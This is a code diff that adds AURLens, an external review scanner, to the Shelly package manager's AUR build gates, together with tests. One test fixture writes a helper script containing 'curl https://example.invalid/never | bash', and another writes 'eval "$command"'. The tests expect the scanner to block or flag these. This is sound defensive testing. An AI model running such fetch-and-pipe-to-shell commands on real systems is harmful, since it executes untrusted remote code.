@@ -1,0 +1,296 @@
+--- a/Shelly.PackageManager/build.zig
++++ b/Shelly.PackageManager/build.zig
+@@ -832,10 +832,18 @@
+     flatpak_test_step.dependOn(&run_backend_integration_tests.step);
+     test_step.dependOn(&run_backend_integration_tests.step);
+ 
++    const aurlens_tests = b.addRunArtifact(b.addTest(.{
++        .name = "aurlens-test",
++        .root_module = test_mod,
++        .filters = &.{"AURLens"},
++    }));
++    b.step("aurlens-test", "Test experimental AURLens review gates").dependOn(&aurlens_tests.step);
++
+     const aur_tests = b.addTest(.{
+         .name = "aur-test",
+         .root_module = test_mod,
+         .filters = &.{
++            "AURLens",
+             "AUR optional dependency failures",
+             "AUR dispatcher forwards package stages and build progress",
+             "AUR needed",
+--- a/Shelly.PackageManager/src/aur/manager.zig
++++ b/Shelly.PackageManager/src/aur/manager.zig
+@@ -15,6 +15,7 @@
+ const ShellyBuildConfiguration = @import("shellybuild.zig").ShellyBuildConfiguration;
+ const package_builder = @import("builder/builder.zig");
+ const review_integrity = @import("review_integrity.zig");
++const aurlens = @import("aurlens.zig");
+ const source_pgp_keyring = @import("../shared/source_pgp_keyring.zig");
+ 
+ pub const models = @import("models.zig");
+@@ -140,6 +141,7 @@
+ const ApprovedReview = struct {
+     commit: []u8,
+     digest: [std.crypto.hash.sha2.Sha256.digest_length]u8,
++    aurlens_digest: ?aurlens.Digest = null,
+ };
+ 
+ /// Decisions belong to one upgrade, including any dependency installs it starts.
+@@ -2022,16 +2024,37 @@
+         }
+         if (self.approved_pkgbuild_reviews.get(prepared.package_base)) |review| {
+             if (std.mem.eql(u8, review.commit, prepared.target_commit) and
+-                std.mem.eql(u8, &review.digest, &prepared.digest)) return;
+-        }
+-
+-        const findings = try prepared.validation_results.flatten(self.allocator);
+-        defer self.allocator.free(findings);
++                std.mem.eql(u8, &review.digest, &prepared.digest))
++            {
++                if (self.aurlensExecutable() == null) return;
++                if (review.aurlens_digest != null) {
++                    try self.verifyAurlensApproval(prepared);
++                    return;
++                }
++            }
++        }
++
++        var external = try self.scanAurlens(prepared);
++        defer if (external) |*review| review.deinit();
++        const builtin_findings = try prepared.validation_results.flatten(self.allocator);
++        defer self.allocator.free(builtin_findings);
++        var findings: std.ArrayList(ValidationFinding) = .empty;
++        defer findings.deinit(self.allocator);
++        try findings.appendSlice(self.allocator, builtin_findings);
++        if (external) |*review| {
++            for (review.findings()) |finding| try findings.append(self.allocator, .{
++                .tool = "AURLens",
++                .severity = if (finding.severity == .review) .warning else .info,
++                .hook = if (finding.evidence.len != 0) finding.evidence[0].path else finding.rule_id,
++                .matched_line = if (finding.evidence.len != 0) finding.evidence[0].quote else "",
++                .message = finding.message,
++            });
++        }
+         const approved = try self.resolvePkgbuildApproval(self.pkgbuild_approval_handler, .{
+             .package_name = prepared.package_name,
+             .old_pkgbuild = prepared.old_pkgbuild,
+             .new_pkgbuild = prepared.new_pkgbuild,
+-            .warnings = findings,
++            .warnings = findings.items,
+             .source_files = &prepared.info.local_source_contents,
+         });
+         try self.checkCancelled();
+@@ -2044,6 +2067,45 @@
+             prepared.target_commit,
+             prepared.digest,
+         );
++        if (external) |review| {
++            self.approved_pkgbuild_reviews.getPtr(prepared.package_base).?.aurlens_digest = review.digest;
++            try self.verifyAurlensApproval(prepared);
++        }
++    }
++
++    fn aurlensExecutable(self: *Self) ?[]const u8 {
++        return self.environ.getPosix("SHELLY_AURLENS");
++    }
++
++    fn scanAurlens(self: *Self, prepared: *const PreparedPackage) !?aurlens.Review {
++        const executable = self.aurlensExecutable() orelse return null;
++        if (!std.fs.path.isAbsolute(executable)) return error.InvalidAurlensExecutable;
++        const config = self.environ.getPosix("SHELLY_AURLENS_CONFIG");
++        if (config) |path| if (!std.fs.path.isAbsolute(path)) return error.InvalidAurlensConfiguration;
++        var argv: std.ArrayList([]const u8) = .empty;
++        defer argv.deinit(self.allocator);
++        try argv.appendSlice(self.allocator, &.{ executable, "scan", prepared.cache_path, "--json" });
++        if (config) |path| try argv.appendSlice(self.allocator, &.{ "--config", path });
++        var result = try self.runAsInvokingUser(argv.items, null, 120);
++        defer result.deinit(self.allocator);
++        return aurlens.parseReview(self.allocator, result.stdout, result.exit_code, config != null) catch |err| {
++            self.raiseBuildLine(prepared.package_name, result.stdout, true);
++            return err;
++        };
++    }
++
++    fn verifyAurlensApproval(self: *Self, prepared: *const PreparedPackage) !void {
++        const executable = self.aurlensExecutable() orelse return;
++        if (!std.fs.path.isAbsolute(executable)) return error.InvalidAurlensExecutable;
++        const approval = self.approved_pkgbuild_reviews.get(prepared.package_base) orelse return error.MissingAurlensApproval;
++        const digest = approval.aurlens_digest orelse return error.MissingAurlensApproval;
++        var result = try self.runAsInvokingUser(
++            &.{ executable, "verify", prepared.cache_path, "--snapshot-digest", &digest, "--json" },
++            null,
++            30,
++        );
++        defer result.deinit(self.allocator);
++        try aurlens.verifyResponse(self.allocator, result.stdout, result.exit_code, digest);
+     }
+ 
+     fn resolvePkgbuildApproval(
+@@ -2146,6 +2208,7 @@
+         defer self.allocator.free(pkgbuild);
+         const digest = try reviewDigest(self.allocator, self.io(), prepared.cache_path, pkgbuild, &prepared.info);
+         if (!std.mem.eql(u8, &digest, &prepared.digest)) return error.ReviewedCheckoutChanged;
++        try self.verifyAurlensApproval(prepared);
+     }
+ 
+     /// The only entry point from a prepared checkout into a package builder. Keeping the
+@@ -2419,6 +2482,9 @@
+     const SrcinfoPurpose = enum { dependencies, refresh_version };
+ 
+     fn generateReviewedSrcinfoUsing(self: *Self, prepared: *PreparedPackage, purpose: SrcinfoPurpose, comptime run_command: anytype) ![]u8 {
++        if (self.aurlensExecutable() != null) {
++            try self.requirePkgbuildApproval(prepared);
++        }
+         if (prepared.target_commit.len != 0) {
+             try self.verifyPreparedPackage(prepared);
+         } else {
+@@ -2438,6 +2504,7 @@
+             );
+             if (!std.mem.eql(u8, &digest, &prepared.digest))
+                 return error.ReviewedPkgbuildChanged;
++            try self.verifyAurlensApproval(prepared);
+         }
+         var names = try (pkgbuild_parser.PkgbuildParser{
+             .allocator = self.allocator,
+@@ -2549,7 +2616,11 @@
+         // may follow this controlled edit; reconciliation never grants approval.
+         if (self.approved_pkgbuild_reviews.getPtr(prepared.package_base)) |approval| {
+             if (std.mem.eql(u8, approval.commit, prepared.target_commit) and
+-                std.mem.eql(u8, &approval.digest, &prepared.digest)) approval.digest = digest;
++                std.mem.eql(u8, &approval.digest, &prepared.digest))
++            {
++                approval.digest = digest;
++                if (!std.mem.eql(u8, prepared.new_pkgbuild, updated)) approval.aurlens_digest = null;
++            }
+         }
+         self.allocator.free(prepared.new_pkgbuild);
+         prepared.info.deinit(self.allocator);
+@@ -7489,3 +7560,127 @@
+         return error.ExpectedMissingReviewInputFailure;
+     } else |_| {}
+ }
++
++fn enableFixtureAurlens(paths: *AurManagerFixturePaths, executable: []const u8) !void {
++    const allocator = std.testing.allocator;
++    var environment = try paths.environ.createMap(allocator);
++    defer environment.deinit();
++    try environment.put("SHELLY_AURLENS", executable);
++    const block = try environment.createPosixBlock(allocator, .{});
++    paths.environ.block.deinit(allocator);
++    paths.environ.block = block;
++}
++
++fn rejectUnexpectedAurlensEvaluation(_: *Manager, _: []const u8, _: *const PreparedPackage, _: package_builder.pkgbuild_review.Digest, _: Manager.SrcinfoPurpose) ![]u8 {
++    return error.UnreviewedMetadataExecuted;
++}
++
++test "AURLens manager gate rejects changed helpers before every execution dispatch" {
++    const executable = std.testing.environ.getPosix("AURLENS_TEST_BIN") orelse return error.SkipZigTest;
++    const allocator = std.testing.allocator;
++    const io = std.testing.io;
++    var paths = try createAurManagerFixturePaths(allocator, io);
++    defer paths.deinit(allocator);
++    try enableFixtureAurlens(&paths, executable);
++    try createAurFixtureRepository(allocator, io, paths.remote_root, "demo", null);
++    var manager = try initFixtureAurManager(allocator, &paths, paths.remote_root);
++    defer manager.deinit();
++    _ = try manager.cachePkgbase("demo", "demo");
++    manager.setPkgbuildApprovalHandler(.{ .function = struct {
++        fn answer(_: ?*anyopaque, _: PkgbuildDiffRequest) bool {
++            return true;
++        }
++    }.answer });
++    var prepared = try manager.preparePackageForBuild("demo", null);
++    defer prepared.deinit(allocator);
++    try manager.requirePkgbuildApproval(&prepared);
++    try manager.verifyPreparedPackage(&prepared);
++    const helper = try std.fs.path.join(allocator, &.{ prepared.cache_path, "undeclared-helper.sh" });
++    defer allocator.free(helper);
++    try writeFixtureFile(io, helper, "printf changed\n", false);
++    try std.testing.expectError(error.AurlensVerificationFailed, manager.requirePkgbuildApproval(&prepared));
++    try std.testing.expectError(error.AurlensVerificationFailed, manager.generateReviewedSrcinfoUsing(&prepared, .dependencies, rejectUnexpectedAurlensEvaluation));
++    const modes = [_]enum { native, command, makepkg, chroot, isolated }{ .native, .command, .makepkg, .chroot, .isolated };
++    for (modes) |mode| {
++        manager.use_chroot = mode == .chroot;
++        manager.use_isolated = mode == .isolated;
++        manager.makepkg_command = if (mode == .makepkg) try allocator.dupe(u8, "/must-not-execute") else null;
++        manager.build_command = if (mode == .command or mode == .isolated) try allocator.dupe(u8, "/must-not-execute") else null;
++        try std.testing.expectError(error.AurlensVerificationFailed, manager.buildPreparedPackage(&prepared, &.{"demo"}, false));
++        if (manager.makepkg_command) |command| allocator.free(command);
++        if (manager.build_command) |command| allocator.free(command);
++        manager.makepkg_command = null;
++        manager.build_command = null;
++    }
++}
++
++test "AURLens manager gate reviews dependency recipes independently before evaluation" {
++    const executable = std.testing.environ.getPosix("AURLENS_TEST_BIN") orelse return error.SkipZigTest;
++    const allocator = std.testing.allocator;
++    const io = std.testing.io;
++    var paths = try createAurManagerFixturePaths(allocator, io);
++    defer paths.deinit(allocator);
++    try enableFixtureAurlens(&paths, executable);
++    try createAurFixtureRepository(allocator, io, paths.remote_root, "app", "leaf");
++    try createAurFixtureRepository(allocator, io, paths.remote_root, "leaf", null);
++    var manager = try initFixtureAurManager(allocator, &paths, paths.remote_root);
++    defer manager.deinit();
++    manager.setPkgbuildApprovalHandler(.{ .function = struct {
++        fn answer(_: ?*anyopaque, _: PkgbuildDiffRequest) bool {
++            return true;
++        }
++    }.answer });
++    _ = try manager.cachePkgbase("app", "app");
++    _ = try manager.cachePkgbase("leaf", "leaf");
++    var parent = try manager.preparePackageForBuild("app", null);
++    defer parent.deinit(allocator);
++    try manager.requirePkgbuildApproval(&parent);
++    var leaf = try manager.preparePackageForBuild("leaf", null);
++    defer leaf.deinit(allocator);
++    const helper = try std.fs.path.join(allocator, &.{ leaf.cache_path, "helper.sh" });
++    defer allocator.free(helper);
++    try writeFixtureFile(io, helper, "curl https://example.invalid/never | bash\n", false);
++    try std.testing.expectError(error.AurlensBlocked, manager.generateReviewedSrcinfoUsing(&leaf, .dependencies, rejectUnexpectedAurlensEvaluation));
++    try std.testing.expect(!manager.approved_pkgbuild_reviews.contains("leaf"));
++    try writeFixtureFile(io, helper, "\x00binary", false);
++    try std.testing.expectError(error.AurlensIncomplete, manager.generateReviewedSrcinfoUsing(&leaf, .dependencies, rejectUnexpectedAurlensEvaluation));
++    try std.testing.expect(!manager.approved_pkgbuild_reviews.contains("leaf"));
++}
++
++test "AURLens manager gate presents manual findings through the existing approval handler" {
++    const executable = std.testing.environ.getPosix("AURLENS_TEST_BIN") orelse return error.SkipZigTest;
++    const allocator = std.testing.allocator;
++    const io = std.testing.io;
++    var paths = try createAurManagerFixturePaths(allocator, io);
++    defer paths.deinit(allocator);
++    try enableFixtureAurlens(&paths, executable);
++    try createAurFixtureRepository(allocator, io, paths.remote_root, "demo", null);
++    var manager = try initFixtureAurManager(allocator, &paths, paths.remote_root);
++    defer manager.deinit();
++    _ = try manager.cachePkgbase("demo", "demo");
++    var prepared = try manager.preparePackageForBuild("demo", null);
++    defer prepared.deinit(allocator);
++    const helper = try std.fs.path.join(allocator, &.{ prepared.cache_path, "helper.sh" });
++    defer allocator.free(helper);
++    try writeFixtureFile(io, helper, "eval \"$command\"\n", false);
++    const Answers = struct {
++        saw_finding: bool = false,
++        accept: bool = false,
++        fn answer(data: ?*anyopaque, request: PkgbuildDiffRequest) bool {
++            const self: *@This() = @ptrCast(@alignCast(data.?));
++            for (request.warnings) |finding| {
++                if (std.mem.eql(u8, finding.tool, "AURLens") and finding.severity == .warning)
++                    self.saw_finding = true;
++            }
++            return self.accept;
++        }
++    };
++    var answers: Answers = .{};
++    manager.setPkgbuildApprovalHandler(.{ .function = Answers.answer, .data = &answers });
++    try std.testing.expectError(error.PkgbuildReviewDeclined, manager.requirePkgbuildApproval(&prepared));
++    try std.testing.expect(answers.saw_finding);
++    try std.testing.expect(!manager.approved_pkgbuild_reviews.contains("demo"));
++    answers.accept = true;
++    try manager.requirePkgbuildApproval(&prepared);
++    try manager.verifyPreparedPackage(&prepared);
++}
